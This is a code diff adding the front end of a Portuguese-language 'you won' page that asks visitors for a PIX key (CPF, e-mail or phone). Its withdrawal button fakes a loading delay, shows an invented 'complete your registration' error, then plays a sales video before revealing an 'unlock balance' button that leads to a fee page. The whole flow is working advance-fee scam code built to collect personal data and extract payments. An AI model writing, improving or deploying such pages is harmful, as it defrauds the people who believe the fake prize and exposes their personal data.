+                    <h2 class="pix-title">Parabéns!</h2>
+                    <p class="pix-subtitle">Você ganhou:</p>
+                    <div class="pix-amount">R$ ${totalEarned},00</div>
+                    
+                    <p class="pix-subtitle">Para receber seu PIX, selecione o tipo de chave e insira os dados:</p>
+                    
+                    <div class="custom-select-wrapper">
+                        <div class="custom-select">
+                            <span class="custom-select-trigger">Selecione o tipo de chave</span>
+                            <div class="custom-options">
+                                <div class="custom-option" data-value="cpf">CPF</div>
+                                <div class="custom-option" data-value="email">E-mail</div>
+                                <div class="custom-option" data-value="telefone">Telefone</div>
+                                <div class="custom-option" data-value="aleatoria">Chave Aleatória</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <input type="text" class="pix-key-input" id="pixKeyInput" placeholder="Digite sua chave PIX" required>
+                    
+                    <button class="pix-button" onclick="withdrawPix()">
+                        SACAR R$ ${totalEarned},00
+                    </button>
+                    
+                    <p class="pix-info">
+                        O valor será enviado para a chave PIX informada em até 24 horas.
+                    </p>
+                </div>
+            `;
+
+            // Initialize custom select
+            const customSelect = document.querySelector('.custom-select');
+            const selectTrigger = document.querySelector('.custom-select-trigger');
+            const options = document.querySelectorAll('.custom-option');
+            const pixKeyInput = document.getElementById('pixKeyInput');
+
+            document.addEventListener('click', function(e) {
+                if (!customSelect.contains(e.target)) {
+                    customSelect.classList.remove('open');
+                }
+            });
+
+            selectTrigger.addEventListener('click', function() {
+                customSelect.classList.toggle('open');
+            });
+
+            options.forEach(option => {
+                option.addEventListener('click', function() {
+                    selectTrigger.textContent = this.textContent;
+                    options.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    customSelect.classList.remove('open');
+                    
+                    // Update input placeholder based on selection
+                    const value = this.getAttribute('data-value');
+                    switch(value) {
+                        case 'cpf':
+                            pixKeyInput.placeholder = 'Digite seu CPF (apenas números)';
+                            break;
+                        case 'email':
+                            pixKeyInput.placeholder = 'Digite seu e-mail';
+                            break;
+                        case 'telefone':
+                            pixKeyInput.placeholder = 'Digite seu telefone (apenas números)';
+                            break;
+                        case 'aleatoria':
+                            pixKeyInput.placeholder = 'Digite sua chave aleatória';
+                            break;
+                    }
+                    pixKeyInput.value = '';
+                });
+            });
+        }
+
+        let isWithdrawing = false;
+
+        function withdrawPix() {
+            if (isWithdrawing) return;
+            
+            const pixKey = document.querySelector('.pix-key-input').value;
+            
+            if (!pixKey) {
+                alert('Por favor, insira uma chave PIX válida');
+                return;
+            }
+
+            isWithdrawing = true;
+            const container = document.querySelector('.pix-compact-container');
+
+            // Create and show loading overlay
+            const loadingOverlay = document.createElement('div');
+            loadingOverlay.className = 'loading-overlay';
+            loadingOverlay.innerHTML = '<div class="loading-spinner"></div>';
+            container.appendChild(loadingOverlay);
+            loadingOverlay.style.display = 'flex';
+
+            // Wait 3 seconds then show error
+            setTimeout(() => {
+                loadingOverlay.remove();
+                
+                // Create overlay
+                const overlay = document.createElement('div');
+                overlay.className = 'overlay';
+                document.body.appendChild(overlay);
+
+                // Create error popup
+                const errorPopup = document.createElement('div');
+                errorPopup.className = 'error-popup';
+                errorPopup.innerHTML = `
+                    <h3>Atenção</h3>
+                    <p>Para realizar o saque, é necessário concluir seu cadastro</p>
+                    <button class="error-button" onclick="redirecionar(event)">Concluir Cadastro</button>
+                `;
+                document.body.appendChild(errorPopup);
+                
+                isWithdrawing = false;
+            }, 3000);
+        }
+
+        function showVideo() {
+            // Remove error popup and overlay
+            document.querySelector('.error-popup').remove();
+            document.querySelector('.overlay').remove();
+
+            // Clear the question container and add video section
+            const videoSection = document.createElement('div');
+            videoSection.className = 'video-section';
+            videoSection.innerHTML = `
+                <h2 class="video-title">ATENÇÃO: ASSISTA O VÍDEO</h2>
+                <div class="video-container">
+                    <video id="player" playsinline>
+                        <source src="https://vslvideos.b-cdn.net/nu.mp4" type="video/mp4" />
+                    </video>
+                </div>
+                <button class="unlock-button" onclick="window.location.href='taxa/'">
+                    DESBLOQUEAR SALDO
+                </button>
+            `;
+            
+            document.querySelector('.question-container').innerHTML = '';
+            document.querySelector('.question-container').appendChild(videoSection);
+
+            // Initialize Plyr with only the big play button
+            const player = new Plyr('#player', {
+                controls: ['play-large'],
+                clickToPlay: true,
+                hideControls: true,
+                resetOnEnd: true
+            });
+
+            // Show unlock button after 60 seconds of video playback
+            let timeWatched = 0;
+            const unlockButton = document.querySelector('.unlock-button');
+            
+            player.on('timeupdate', (event) => {
+                timeWatched = player.currentTime;
+                if (timeWatched >= 60 && unlockButton.style.display !== 'block') {
+                    unlockButton.style.display = 'block';
+                }
+            });
+        }
+    </script>
+
+
+</body></html>
